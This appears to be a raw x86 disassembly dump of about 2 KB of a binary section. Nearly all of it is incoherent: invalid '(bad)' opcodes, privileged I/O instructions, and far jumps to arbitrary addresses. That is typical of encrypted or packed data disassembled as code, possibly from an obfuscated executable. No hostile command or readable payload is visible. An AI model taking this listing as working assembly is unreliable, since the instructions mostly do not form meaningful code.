  4111b3:	or     eax,0x8117014b
  4111b8:	sub    edx,ebp
  4111ba:	inc    eax
  4111bb:	mov    edx,0x7eafe86d
  4111c0:	pushf  
  4111c1:	xchg   ebx,eax
  4111c2:	and    eax,0x50f9f24f
  4111c7:	out    0xe9,eax
  4111c9:	cdq    
  4111ca:	mov    ebx,0xa63b5ef9
  4111cf:	fsub   st,st(7)
  4111d1:	pop    ss
  4111d2:	imul   esi,DWORD PTR [ebx-0x79],0xfffffff6
  4111d6:	cli    
  4111d7:	add    ch,BYTE PTR [esi+0x47eae18e]
  4111dd:	jns    0x41123b
  4111df:	dec    ebp
  4111e0:	inc    ecx
  4111e1:	inc    eax
  4111e2:	aas    
  4111e3:	pop    es
  4111e4:	(bad)  
  4111e5:	std    
  4111e6:	push   0x254b08c8
  4111eb:	shr    DWORD PTR [ecx+0x64],0xc2
  4111ef:	les    edx,FWORD PTR [edi-0x42a8b52]
  4111f5:	test   dh,ch
  4111f7:	arpl   WORD PTR [ebp-0x77],cx
  4111fa:	aas    
  4111fb:	mov    dh,0x7e
  4111fd:	and    al,0xca
  4111ff:	mov    eax,0x2159c0ea
  411204:	or     edi,DWORD PTR [ecx]
  411206:	sbb    ch,BYTE PTR [edx-0x198a75cc]
  41120c:	mov    ch,0x16
  41120e:	mov    BYTE PTR [ebx+ebx*8],dh
  411211:	dec    eax
  411212:	cmp    ebx,DWORD PTR [edx+ebx*4+0x4d]
  411216:	rcr    dl,0x5a
  411219:	ss push edi
  41121b:	fwait
  41121c:	xchg   ebp,edx
  41121e:	shr    BYTE PTR [esi],1
  411220:	push   0x634eaf26
  411225:	loop   0x411235
  411227:	sub    dl,BYTE PTR [ebp+ebp*1+0x43]
  41122b:	adc    al,0xc2
  41122d:	jo     0x41127f
  41122f:	and    al,BYTE PTR [edi+0x73]
  411232:	mov    edx,0x45700204
  411237:	inc    edx
  411238:	or     ebp,DWORD PTR [edx]
  41123a:	mov    dl,0x94
  41123c:	mov    edi,0x95c1f71b
  411241:	dec    esi
  411242:	jg     0x4111cd
  411244:	jnp    0x4112b6
  411246:	xor    DWORD PTR [ebx-0x2411baa1],edx
  41124c:	jl     0x4112c3
  41124e:	xchg   edi,eax
  41124f:	pop    ebp
  411250:	(bad)  
  411251:	jns    0x41122a
  411253:	test   DWORD PTR [ecx],edi
  411255:	sub    DWORD PTR [ebx+0x6c3f841f],ebx
  41125b:	inc    eax
  41125c:	das    
  41125d:	call   0x1c09:0xa81a197e
  411264:	mov    cs,WORD PTR [edx+0x3203088b]
  41126a:	mov    eax,0xa019164f
  41126f:	retf   0x5bdb
  411272:	push   edx
  411273:	in     al,0x57
  411275:	fcmovbe st,st(4)
  411277:	adc    eax,0x6fb1327f
  41127c:	out    dx,eax
  41127d:	push   esp
  41127e:	repz adc ecx,DWORD PTR [ecx]
  411281:	cwde   
  411282:	sbb    ch,ah
  411284:	lods   eax,DWORD PTR ds:[esi]
  411285:	int    0x1f
  411287:	xchg   ecx,eax
  411288:	mov    dh,0x45
  41128a:	pop    es
  41128b:	sub    eax,DWORD PTR [edi]
  41128d:	cmp    al,0x81
  41128f:	xchg   ebp,edx
  411291:	jmp    0xcb795860
  411296:	adc    DWORD PTR [ecx+eax*2-0x634ddf7a],esi
  41129d:	push   edx
  41129e:	aas    
  41129f:	bnd jb 0x411280
  4112a2:	pop    edi
  4112a3:	ja     0x4112d0
  4112a5:	mov    ds,WORD PTR [eax+0x140593b3]
  4112ab:	mov    ecx,0x496109d3
  4112b0:	xchg   edi,eax
  4112b1:	scas   al,BYTE PTR es:[edi]
  4112b2:	retf   0xb01b
  4112b5:	jae    0x4112c7
  4112b7:	xchg   ebp,eax
  4112b8:	adc    bh,BYTE PTR [ebx+ecx*4-0x17e9dbd0]
  4112bf:	fidivr DWORD PTR [ebp+0x48]
  4112c2:	inc    edi
  4112c3:	or     al,0x40
  4112c5:	push   cs
  4112c6:	adc    eax,0x71584323
  4112cb:	add    BYTE PTR [ebp+0x7fdc7643],ch
  4112d1:	call   0x12b:0x5addd448
  4112d8:	push   ss
  4112d9:	mov    ds:0x74ff7317,al
  4112de:	ds mov eax,0xce856997
  4112e4:	xlat   BYTE PTR ds:[ebx]
  4112e5:	jge    0x411360
  4112e7:	push   ebx
  4112e8:	xor    ah,BYTE PTR [esi+edx*2+0x233eda9e]
  4112ef:	cli    
  4112f0:	or     ch,bl
  4112f2:	sub    eax,0xc31fe07b
  4112f7:	or     al,0xb0
  4112f9:	jo     0x41134b
  4112fb:	int3   
  4112fc:	push   ecx
  4112fd:	inc    eax
  4112fe:	imul   esp,DWORD PTR [ecx+esi*4+0x7e],0x32
  411303:	(bad)  
  411304:	sbb    edx,DWORD PTR [esi]
  411306:	je     0x411324
  411308:	xchg   ecx,eax
  411309:	fistp  DWORD PTR [eax-0x6a]
  41130c:	mov    ebp,0xfd6358d1
  411311:	pop    ebx
  411312:	and    al,0x67
  411314:	stos   BYTE PTR es:[edi],al
  411315:	mov    WORD PTR [ebx],?
  411317:	pop    ebp
  411318:	add    eax,0xeaf2c599
  41131d:	sbb    al,0x66
  41131f:	out    dx,eax
  411320:	fimul  DWORD PTR [ebp-0x2e]
  411323:	inc    esp
  411324:	loop   0x411314
  411326:	in     al,dx
  411327:	add    al,0x69
  411329:	jmp    0x3373:0x29314062
  411330:	sbb    bl,BYTE PTR [edx+0x16]
  411333:	pop    ebp
  411334:	inc    ebx
  411335:	sbb    bl,cl
  411337:	jno    0x4112fb
  411339:	popa   
  41133a:	and    DWORD PTR [ebx+0x78],edi
  41133d:	add    al,0x92
  41133f:	iret   
  411340:	js     0x411334
  411342:	dec    ebx
  411343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411344:	pushf  
  411345:	cdq    
  411346:	push   edx
  411347:	loopne 0x4113b8
  411349:	scas   eax,DWORD PTR es:[edi]
  41134a:	sub    DWORD PTR [ebp-0x8e9dbb1],ebp
  411350:	les    eax,FWORD PTR [ebp+0x29]
  411353:	pop    ecx
  411354:	stos   DWORD PTR es:[edi],eax
  411355:	ins    BYTE PTR es:[edi],dx
  411356:	or     al,0x5b
  411358:	cwde   
  411359:	dec    edi
  41135a:	mov    edi,0xd200b3e1
  41135f:	fnsave [edi+0x21]
  411362:	not    BYTE PTR [ebx-0x7293d30d]
  411368:	sub    ch,al
  41136a:	sub    BYTE PTR [ebx],dl
  41136c:	lea    ebp,[eax-0x3c]
  41136f:	cs rdmsr 
  411372:	adc    dh,BYTE PTR [esi]
  411374:	cli    
  411375:	pop    esi
  411376:	jge    0x411375
  411378:	mov    edi,DWORD PTR ds:0x57f85260
  41137e:	inc    edx
  41137f:	sub    edx,DWORD PTR [ebx-0x4f]
  411382:	jno    0x41130a
  411384:	(bad)  
  411385:	jmp    FWORD PTR [ecx-0xa7eea1a]
  41138b:	dec    edi
  41138c:	mov    bl,BYTE PTR [ebp+0x49]
  41138f:	xor    al,0xae
  411391:	es pop ecx
  411393:	inc    edi
  411394:	xor    al,0x7f
  411396:	or     BYTE PTR [eax-0x3c],dh
  411399:	or     cl,BYTE PTR [edi+0x70]
  41139c:	lods   eax,DWORD PTR ds:[esi]
  41139d:	scas   eax,DWORD PTR es:[edi]
  41139e:	cmp    esp,DWORD PTR [edx+0x3b]
  4113a1:	mov    ebp,0x3ff32058
  4113a6:	push   edi
  4113a7:	inc    DWORD PTR [eax]
  4113a9:	lea    edx,[ecx+0x6c]
  4113ac:	mov    BYTE PTR [edx],ah
  4113ae:	jg     0x411338
  4113b0:	es mov esp,0x474adec7
  4113b6:	pop    ss
  4113b7:	test   BYTE PTR [ecx+0x3d6fd00],ch
  4113bd:	and    dl,BYTE PTR [edi+0x294bcdaa]
  4113c3:	iret   
  4113c4:	popf   
  4113c5:	js     0x4113be
  4113c7:	cld    
  4113c8:	inc    edx
  4113c9:	in     eax,dx
  4113ca:	cmp    esp,DWORD PTR cs:[esi+0x2]
  4113ce:	and    BYTE PTR [eiz*1-0x484ebf00],dh
  4113d5:	push   esp
  4113d6:	jp     0x411412
  4113d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113d9:	xchg   edi,eax
  4113da:	pop    edx
  4113db:	xor    BYTE PTR [ebp-0x319912fb],bl
  4113e1:	push   es
  4113e2:	data16 not al
  4113e5:	inc    esp
  4113e6:	push   es
  4113e7:	lds    esp,FWORD PTR [ebx-0x28]
  4113ea:	emms   
  4113ec:	pop    edx
  4113ed:	sub    al,0x96
  4113ef:	popf   
  4113f0:	mov    WORD PTR [edx-0x17],?
  4113f3:	dec    ebx
  4113f4:	(bad)  
  4113f6:	pop    edx
  4113f7:	sbb    bl,BYTE PTR [edx-0x364f0ce7]
  4113fd:	add    DWORD PTR fs:[eax+0x46],ebp
  411401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411402:	push   esp
  411403:	add    al,0xdb
  411405:	in     al,0x8b
  411407:	dec    ebx
  411408:	mov    ds:0xd83b795,al
  41140d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41140e:	stos   BYTE PTR es:[edi],al
  41140f:	fnstcw WORD PTR [eax]
  411411:	jl     0x41147a
  411413:	bound  ecx,QWORD PTR [ebp+0x1ce0a580]
  411419:	ins    DWORD PTR es:[edi],dx
  41141a:	sahf   
  41141b:	aam    0xc4
  41141d:	inc    edi
  41141e:	rcl    BYTE PTR [esi+0x55df0cfb],0xe6
  411425:	outs   dx,BYTE PTR ds:[esi]
  411426:	xor    eax,0x19f653d2
  41142b:	fpatan 
  41142d:	adc    ch,cl
  41142f:	mov    eax,0xadad54ca
  411434:	fistp  QWORD PTR [ebp-0x4c272d7]
  41143a:	popf   
  41143b:	call   0x8cf5:0xf1c0a243
  411442:	pop    ecx
  411443:	lahf   
  411444:	fisub  WORD PTR [edx+0x4ca0ba65]
  41144a:	fnstsw WORD PTR [eax+0x37]
  41144d:	in     eax,0x4
  41144f:	jbe    0x4114a6
  411451:	pop    ss
  411452:	inc    ebx
  411453:	outs   dx,DWORD PTR ds:[esi]
  411454:	ss scas al,BYTE PTR es:[edi]
  411456:	mov    bh,BYTE PTR [ebp-0x38d89750]
  41145c:	mov    ds,WORD PTR [ebp+0x3d361627]
  411462:	addr16 sub esi,ecx
  411465:	jg     0x411487
  411467:	scas   eax,DWORD PTR es:[edi]
  411468:	(bad)  
  411469:	and    al,0xab
  41146b:	cmp    DWORD PTR [ebx-0x1d3b91ad],esp
  411471:	mov    esp,DWORD PTR [esi+0x56cd779e]
  411477:	inc    edi
  411478:	clc    
  411479:	sti    
  41147a:	xor    eax,0xd42211eb
  41147f:	pop    edx
  411480:	jle    0x4114cc
  411482:	adc    bl,ah
  411484:	fcmovne st,st(5)
  411486:	test   eax,ecx
  411488:	data16 jb 0x41141e
  41148b:	fwait
  41148c:	inc    ebx
  41148d:	ins    DWORD PTR es:[edi],dx
  41148e:	add    eax,0x642f78d
  411493:	mov    cl,dl
  411495:	dec    DWORD PTR [edi]
  411497:	xchg   esi,eax
  411498:	jns    0x411514
  41149a:	push   edi
  41149b:	jmp    0xfaf275fc
  4114a0:	jg     0x411452
  4114a2:	ins    DWORD PTR es:[edi],dx
  4114a3:	and    BYTE PTR [edx+ebp*1+0x25],dh
  4114a7:	xor    dh,cl
  4114a9:	mov    dh,0x87
  4114ab:	mov    bl,0x9f
  4114ad:	sbb    cl,BYTE PTR [edi+0x3e]
  4114b0:	in     eax,0xdd
  4114b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b3:	mov    DWORD PTR [ecx+ebp*2],esi
  4114b6:	retf   
  4114b7:	fdivr  st(6),st
  4114b9:	std    
  4114ba:	ds jmp 0x41146f
  4114bd:	popa   
  4114be:	sub    DWORD PTR [edi-0x784fb40e],esi
  4114c4:	sub    bl,BYTE PTR [ebx-0x5]
  4114c7:	cdq    
  4114c8:	sub    al,0x25
  4114ca:	sbb    DWORD PTR [ecx+0x10],edx
  4114cd:	repnz mov edi,0x85df6ba7
  4114d3:	(bad)  
  4114d5:	xor    edi,esp
  4114d7:	cmp    al,BYTE PTR [ebp+0x6a]
  4114da:	popa   
  4114db:	ja     0x41152e
  4114dd:	and    ch,BYTE PTR [ebx-0x11c818cb]
  4114e3:	test   eax,0x51388145
  4114e8:	sbb    BYTE PTR [esi+0x522c586],dh
  4114ee:	call   0x94182b95
  4114f3:	pop    edx
  4114f4:	imul   esp,DWORD PTR [edi-0x812d616],0xfffffff9
  4114fb:	pop    ebp
  4114fc:	push   0xbccf902a
  411501:	mov    al,ds:0x24d7511b
  411506:	add    al,0xff
  411508:	pop    ds
  411509:	cwde   
  41150a:	ins    DWORD PTR es:[edi],dx
  41150b:	sbb    DWORD PTR [ebx+0x53],ecx
  41150e:	bound  ecx,QWORD PTR [ebx+0x2f]
  411511:	xchg   ebx,eax
  411512:	lods   eax,DWORD PTR ds:[esi]
  411513:	mov    ah,0xe7
  411515:	ret    
  411516:	jno    0x411554
  411518:	sub    eax,ecx
  41151a:	paddsw mm5,mm7
  41151d:	jnp    0x41155f
  41151f:	cmp    eax,0x69781220
  411524:	or     eax,0xadcb43c7
  411529:	leave  
  41152a:	cwde   
  41152b:	and    al,0x81
  41152d:	push   ds
  41152e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41152f:	test   DWORD PTR [esi+0x60],edx
  411532:	pusha  
  411533:	push   0x1c
  411535:	push   esi
  411536:	jmp    0xda3f:0xe8034ffe
  41153d:	cli    
  41153e:	mov    esp,0x761ce786
  411543:	stos   BYTE PTR es:[edi],al
  411544:	repz jge 0x411535
  411547:	out    dx,al
  411548:	out    dx,al
  411549:	jmp    0x9e695be8
  41154e:	xchg   esi,eax
  41154f:	cmp    bh,bl
  411551:	repz out 0x3b,al
  411554:	ds sti 
  411556:	pop    ecx
  411557:	xchg   ebp,eax
  411558:	enter  0x490b,0x78
  41155c:	pop    esp
  41155d:	or     ebx,DWORD PTR [eax+0x3de89383]
  411563:	ds sti 
  411565:	sub    ch,BYTE PTR [esp+esi*2-0x26fa3f96]
  41156c:	test   ebx,0xa7766127
  411572:	repnz inc eax
  411574:	push   0x24
  411576:	xor    al,0x33
  411578:	cld    
  411579:	icebp  
  41157a:	xchg   edx,eax
  41157b:	mov    cl,0x11
  41157d:	scas   eax,DWORD PTR es:[edi]
  41157e:	and    eax,0x3d820a4e
  411583:	nop
  411584:	mov    al,0x2
  411586:	rcr    DWORD PTR [ebx-0x76943fc],cl
  41158c:	nop
  41158d:	lea    edi,[eax+edx*4-0x2f008228]
  411594:	in     eax,0xaf
  411596:	inc    esi
  411597:	cmc    
  411598:	fild   QWORD PTR [edx-0xb453ee4]
  41159e:	mov    edi,DWORD PTR [edi]
  4115a0:	push   ebx
  4115a1:	sbb    cl,BYTE PTR [esi-0x11]
  4115a4:	lods   al,BYTE PTR ds:[esi]
  4115a5:	mov    cl,0x3b
  4115a7:	jle    0x411618
  4115a9:	in     eax,0xf2
  4115ab:	scas   al,BYTE PTR es:[edi]
  4115ac:	mov    bl,0x41
  4115ae:	daa    
  4115af:	push   cs
  4115b0:	ss mov ebx,0x2cc9195
  4115b6:	xor    BYTE PTR [edi-0x4f],0x8b
  4115ba:	and    al,0xe8
  4115bc:	pextrw edi,mm1,0x6f
  4115c0:	leave  
  4115c1:	sub    al,0x5c
  4115c3:	xor    bl,ch
  4115c5:	(bad)  
  4115c6:	aaa    
  4115c7:	and    DWORD PTR [edx],edx
  4115c9:	xor    dl,BYTE PTR [ecx-0x1d]
  4115cc:	test   al,0x3e
  4115ce:	jns    0x411572
  4115d0:	push   0xffffffcc
  4115d2:	jg     0x411611
  4115d4:	arpl   bx,dx
  4115d6:	les    edi,FWORD PTR ds:0x7546af12
  4115dc:	jae    0x4115eb
  4115de:	out    dx,al
  4115df:	(bad)  [eax]
  4115e1:	dec    edx
  4115e2:	imul   esp,DWORD PTR [ebp+0x6b],0x1e
  4115e6:	dec    eax
  4115e7:	sub    eax,0x20fba186
  4115ec:	mov    fs,WORD PTR [esi]
  4115ee:	in     eax,0x1b
  4115f0:	xor    DWORD PTR ds:0x41b9db59,edx
  4115f6:	cld    
  4115f7:	aas    
  4115f8:	adc    cx,si
  4115fb:	in     eax,dx
  4115fc:	lods   al,BYTE PTR ds:[esi]
  4115fd:	jg     0x411672
  4115ff:	adc    ah,BYTE PTR [si+0x7ee5]
  411604:	stc    
  411605:	xor    eax,0x2cbd9de
  41160a:	(bad)  
  41160b:	jmp    0xf762b69
  411610:	lds    esp,FWORD PTR [esi-0x43]
  411613:	scas   eax,DWORD PTR es:[edi]
  411614:	hlt    
  411615:	mov    al,0xf0
  411617:	aas    
  411618:	out    0xb1,al
  41161a:	ficomp WORD PTR [ebx]
  41161c:	adc    DWORD PTR [edi+edi*1+0x568af541],0xffffffbc
  411624:	inc    ebp
  411625:	pop    ss
  411626:	dec    edi
  411627:	xchg   edx,eax
  411628:	mov    ah,0x92
  41162a:	sub    eax,0xb6c24b67
  41162f:	push   ebx
  411630:	cmp    ch,BYTE PTR [eax-0xd13e50e]
  411636:	dec    esi
  411637:	xor    eax,0x26d3a66d
  41163c:	sub    al,al
  41163e:	leave  
  41163f:	or     dh,BYTE PTR [ebx-0x32929637]
  411645:	jb     0x411676
  411647:	(bad)  
  411648:	cli    
  411649:	icebp  
  41164a:	fst    DWORD PTR [edi]
  41164c:	aad    0xf5
  41164e:	ds mov ah,bh
  411651:	dec    ecx
  411652:	call   0xbd749713
  411657:	and    al,0xcb
  411659:	pause  
  41165b:	jbe    0x41166a
  41165d:	pusha  
  41165e:	mov    ebp,0xfe2567f1
  411663:	jg     0x4116b8
  411665:	je     0x411675
  411667:	mov    DWORD PTR [ebp+0x3b3492b7],eax
  41166d:	inc    eax
  41166e:	push   esi
  41166f:	fidivr DWORD PTR [eax-0x37fb8bc1]
  411675:	fistp  WORD PTR [edx+ebp*1-0x10]
  411679:	or     al,0x85
  41167b:	mov    BYTE PTR ds:0x964fe6cf,bh
  411681:	jnp    0x411653
  411683:	sbb    BYTE PTR [edx],al
  411685:	push   edi
  411686:	ficomp WORD PTR [edx-0x25ae9d06]
  41168c:	cmp    dl,0xfb
  41168f:	pop    edx
  411690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411691:	add    bl,BYTE PTR [ecx+0x219bcd77]
  411697:	sti    
  411698:	push   0x41
  41169a:	stc    
  41169b:	mov    bh,0x31
  41169d:	ja     0x411641
  41169f:	bound  edi,QWORD PTR [eax+eiz*2-0x66]
  4116a3:	and    al,0x5c
  4116a5:	retf   0x6c10
  4116a8:	(bad)  
  4116aa:	push   es
  4116ab:	xchg   BYTE PTR [esi+ebx*1-0xa8129d1],ah
  4116b2:	or     DWORD PTR [eax],ebp
  4116b4:	inc    ecx
  4116b5:	nop
  4116b6:	test   DWORD PTR [ebx+eax*4],0xf1b6cb0d
  4116bd:	rcl    DWORD PTR ds:0x17351544,0x89
  4116c4:	js     0x4116a0
  4116c6:	cmc    
  4116c7:	push   es
  4116c8:	jae    0x41172d
  4116ca:	jmp    0x78041ed9
  4116cf:	xor    esp,edi
  4116d1:	adc    ch,al
  4116d3:	(bad)  
  4116d4:	and    eax,0x29b445da
  4116d9:	pop    eax
  4116da:	inc    esi
  4116db:	gs das 
  4116dd:	lahf   
  4116de:	call   0xcf9b:0xb288e917
  4116e5:	mov    ds:0x934573a0,al
  4116ea:	sahf   
  4116eb:	sbb    BYTE PTR [ebx+eax*8],al
  4116ee:	popa   
  4116ef:	ins    BYTE PTR es:[edi],dx
  4116f0:	and    DWORD PTR [esi+0x5],esp
  4116f3:	inc    eax
  4116f4:	sub    DWORD PTR [ebp+0x78],esi
  4116f7:	or     al,0x81
  4116f9:	lds    ebp,FWORD PTR [esi]
  4116fb:	mov    ah,0xa1
  4116fd:	shl    edi,cl
  4116ff:	mov    eax,ds:0xa46d33e2
  411704:	and    cl,BYTE PTR [eax+edi*4+0x5a]
  411708:	imul   edi,DWORD PTR [edi],0xffffffc2
  41170b:	push   esp
  41170c:	aas    
  41170d:	pop    ebp
  41170e:	xlat   BYTE PTR ds:[ebx]
  41170f:	jge    0x411696
  411711:	pop    ebp
  411712:	mov    DWORD PTR [esi-0x44],ebx
  411715:	mov    BYTE PTR [ebp-0x77],dh
  411718:	nop
  411719:	aas    
  41171a:	jmp    0x41172b
  41171c:	dec    eax
  41171d:	add    al,0xb2
  41171f:	push   edx
  411720:	inc    eax
  411721:	sbb    DWORD PTR [edx-0x3e],edi
  411724:	popf   
  411725:	retf   
  411726:	ficom  DWORD PTR [edi+ebx*4+0x47531fc0]
  41172d:	sbb    eax,0xe8fca77d
  411732:	imul   eax,DWORD PTR [ecx],0xbb24e3e
  411738:	xchg   ecx,eax
  411739:	outs   dx,BYTE PTR ds:[esi]
  41173a:	shl    DWORD PTR [esi+0x768f4a86],0x5e
  411741:	cmp    ah,bl
  411743:	add    ecx,DWORD PTR [edx+0x15458324]
  411749:	mov    eax,ds:0x4fa2254a
  41174e:	lods   eax,DWORD PTR ds:[esi]
  41174f:	mov    ebp,0xabe97461
  411754:	ror    BYTE PTR [ecx+0x16],0x58
  411758:	test   eax,0x61b66ff6
  41175d:	ss jnp 0x4116e6
  411760:	xor    DWORD PTR cs:[ecx],0x3768b936
  411767:	inc    ebp
  411768:	enter  0x1680,0x28
  41176c:	inc    edx
  41176d:	push   ebp
  41176e:	lea    edi,[ebx+0x9fa6235]
  411774:	shl    BYTE PTR [edi-0x4f],1
  411777:	hlt    
  411778:	out    dx,al
  411779:	adc    BYTE PTR [edi+edi*1+0x376aabd6],cl
  411780:	or     DWORD PTR [edx],edx
  411782:	jle    0x411735
  411784:	dec    eax
  411785:	push   es
  411786:	xchg   ebx,eax
  411787:	pop    ebp
  411788:	xlat   BYTE PTR ds:[ebx]
  411789:	cmp    bh,BYTE PTR [eax+0x39e81e0f]
  41178f:	sbb    cl,BYTE PTR [edi+0x2d5ecb37]
  411795:	scas   al,BYTE PTR es:[edi]
  411796:	(bad)  
  411797:	aam    0xcf
  411799:	rcr    BYTE PTR [ebx-0x44596569],0x73
  4117a0:	dec    edi
  4117a1:	test   DWORD PTR [ecx],0x93f1a5f2
  4117a7:	mov    edi,DWORD PTR [ebx+0xa]
  4117aa:	les    ecx,FWORD PTR [edi-0x55]
  4117ad:	popa   
  4117ae:	push   ecx
  4117af:	les    ecx,FWORD PTR [eax+0x3b]
  4117b2:	ins    BYTE PTR es:[edi],dx
  4117b3:	push   ebx
  4117b4:	sbb    edi,DWORD PTR [edx]
  4117b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117b7:	push   edx
  4117b8:	ret    
  4117b9:	jb     0x41177c
  4117bb:	cmp    al,0x16
  4117bd:	stos   DWORD PTR es:[edi],eax
  4117be:	add    BYTE PTR [edi],0x40
  4117c1:	push   eax
  4117c2:	add    cl,BYTE PTR [ecx+0x6]
  4117c5:	or     eax,0xdd505856
  4117ca:	xor    edi,DWORD PTR [edx]
  4117cc:	out    0xe1,al
  4117ce:	dec    dh
  4117d0:	mov    BYTE PTR [ebp+0x2f4dc6c1],0x2c
  4117d7:	je     0x4117a2
  4117d9:	mov    dh,0xed
  4117db:	cld    
  4117dc:	adc    BYTE PTR [ebx-0x4bee92c7],al
  4117e2:	and    dl,BYTE PTR [ebx+0x16cf9f9]
  4117e8:	cwde   
  4117e9:	push   ds
  4117ea:	test   eax,0x64290af7
  4117ef:	pop    ss
  4117f0:	cdq    
  4117f1:	mov    DWORD PTR [edx],ebx
  4117f3:	call   0x59f9:0x37d518fb
  4117fa:	cld    
  4117fb:	adc    al,0xbe
  4117fd:	sub    DWORD PTR [ebp-0x53],eax
  411800:	in     eax,0x76
  411802:	push   ds
  411803:	jo     0x4117b5
  411805:	or     DWORD PTR [ebp-0x44],ebp
  411808:	mov    ds:0xa2ef8987,eax
  41180d:	enter  0xa5c8,0x1b
  411811:	pop    esp
  411812:	sbb    DWORD PTR [edi-0x66c21ac7],esp
  411818:	fisttp WORD PTR [ebp-0x37ab9009]
  41181e:	sbb    ebp,ecx
  411820:	mov    al,ds:0xae2689c5
  411825:	sub    cl,BYTE PTR [esi-0x52]
  411828:	popf   
  411829:	cmp    al,BYTE PTR gs:[ebx+0x51d9d93b]
  411830:	mov    esp,0xae48fcc2
  411835:	(bad)  
  411836:	iret   
  411837:	dec    eax
  411838:	imul   edx,edx,0x96786d0f
  41183e:	or     DWORD PTR [ecx-0x14],edx
  411841:	bnd call 0xb0ea54cb
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xf818ba54
  411868:	push   es
  411869:	xchg   ebx,eax
  41186a:	hlt    
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x3b]
  411873:	sbb    al,0xe0
  411875:	jmp    DWORD PTR [ebx-0x41]
  411878:	adc    BYTE PTR [ecx+0x4e],cl
  41187b:	and    BYTE PTR [esi+0x405c538a],dl
  411881:	mov    WORD PTR [ecx+0x87eb36f],ss
  411887:	cs inc ecx
  411889:	pop    ds
  41188a:	test   eax,0x168ccd9d
  41188f:	pop    edi
  411890:	lds    esi,FWORD PTR [edi+0xa]
  411893:	adc    ebx,DWORD PTR [esi]
  411895:	push   ds
  411896:	and    ah,al
  411898:	ficom  DWORD PTR [eax]
  41189a:	or     ebp,DWORD PTR [esi+esi*8]
  41189d:	or     BYTE PTR [esi-0x1],cl
  4118a0:	sub    eax,0xd851e04f
  4118a5:	ins    DWORD PTR es:[edi],dx
  4118a6:	call   0x514ebb7d
  4118ab:	inc    edx
  4118ac:	(bad)  
  4118ad:	xor    DWORD PTR [edi],edx
  4118af:	inc    ecx
  4118b0:	int3   
  4118b1:	retf   
  4118b2:	fmul   DWORD PTR [eax-0x4c926c6e]
  4118b8:	cmp    dl,BYTE PTR [edx]
  4118ba:	jmp    0x49b42e90
  4118bf:	ss mov bx,?
  4118c3:	popf   
  4118c4:	xor    BYTE PTR [ebp+0x40],ch
  4118c7:	(bad)  
  4118c8:	rcr    BYTE PTR [ebp+0x50],1
  4118cb:	sub    cl,BYTE PTR [edx-0x6e]
  4118ce:	push   edi
  4118cf:	sub    dh,0xe3
  4118d2:	mov    edx,0x20775942
  4118d7:	push   cs
  4118d8:	frstor [ebx+0x2ac42ce0]
  4118de:	call   0x1411:0x94780411
  4118e5:	xchg   edx,eax
  4118e6:	push   eax
  4118e7:	addr16 jno 0x41189c
  4118ea:	push   es
  4118eb:	into   
  4118ec:	arpl   di,sp
  4118ee:	cs push 0x14918d8f
  4118f4:	into   
  4118f5:	icebp  
  4118f6:	imul   edx,DWORD PTR [edi],0xffffffd5
  4118f9:	xor    BYTE PTR [edi+edx*1-0x4c0398d8],0xeb
  411901:	cmp    eax,DWORD PTR [eax+0x40]
  411904:	jle    0x4118bc
  411906:	xor    BYTE PTR [edi+0x1d8bd639],bl
  41190c:	out    0xfe,al
  41190e:	mov    edi,0xfdda763e
  411913:	jmp    0xc43c:0xb16adbcb
  41191a:	mov    BYTE PTR [eax+0x601a8986],ch
  411920:	call   0x9127:0x8951d90
  411927:	imul   edx,eax,0xffffff8c
  41192a:	(bad)  
  41192b:	push   ecx
  41192c:	test   eax,0xd818332f
  411931:	sbb    DWORD PTR [esi+edx*1-0x5da09a75],0x1a
  411939:	or     ebp,DWORD PTR [edi-0xc96348b]
  41193f:	pop    ebx
  411940:	mov    bh,0xf6
  411942:	scas   eax,DWORD PTR es:[edi]
  411943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411944:	and    ebp,DWORD PTR [eax-0x7c2d0f9e]
  41194a:	jl     0x4118e5
  41194c:	aam    0x58
  41194e:	adc    eax,0x4e317ccb
  411953:	mov    bl,0xee
  411955:	(bad)  
  411956:	push   ebp
  411957:	stos   BYTE PTR es:[edi],al
  411958:	push   0xffffffef
  41195a:	rcl    BYTE PTR ds:0x7415d54d,1
  411960:	pushf  
  411961:	add    edi,edi
  411963:	shl    DWORD PTR [ebx-0x1d],0xc4
  411967:	cmp    bl,cl
  411969:	mov    ss,WORD PTR [ebx+0xda63e97]
  41196f:	push   0x4783ecff
  411974:	or     DWORD PTR [edi+ebp*8-0x49],0x1162bc7
  41197c:	or     BYTE PTR [ebx+0x43],al
  41197f:	mov    eax,0xd9fa9762
  411984:	and    dl,BYTE PTR [ebp+0x47c29faf]
  41198a:	ret    0x84fa
  41198d:	test   ah,bl
  41198f:	mov    ch,0x27
  411991:	mov    ds:0xe7b5bfd6,eax
  411996:	add    DWORD PTR [ecx-0x74664e01],eax
  41199c:	call   0x52ec:0x1aee8dfa
  4119a3:	xchg   ecx,eax
  4119a4:	mov    ebx,0xc6c260ff
  4119a9:	push   esp
  4119aa:	add    cl,BYTE PTR [ecx]
  4119ac:	mov    edi,0x47d9bc9c
  4119b1:	fs mov eax,0xdf902f18
  4119b7:	sub    eax,0x20ffa45a
  4119bc:	jnp    0x4119b0
  4119be:	rol    edi,cl
  4119c0:	add    BYTE PTR [eax+0x33],cl
  4119c3:	mov    bh,0xc6
  4119c5:	sub    al,0x1d
  4119c7:	test   BYTE PTR ds:0x8bfd07b3,cl
  4119cd:	retf   0x667e
  4119d0:	inc    ebx
  4119d1:	or     BYTE PTR [eax-0x4b],bh
  4119d4:	adc    ecx,DWORD PTR [ecx]
  4119d6:	push   ecx
  4119d7:	add    BYTE PTR [ecx],dh
  4119d9:	dec    ebx
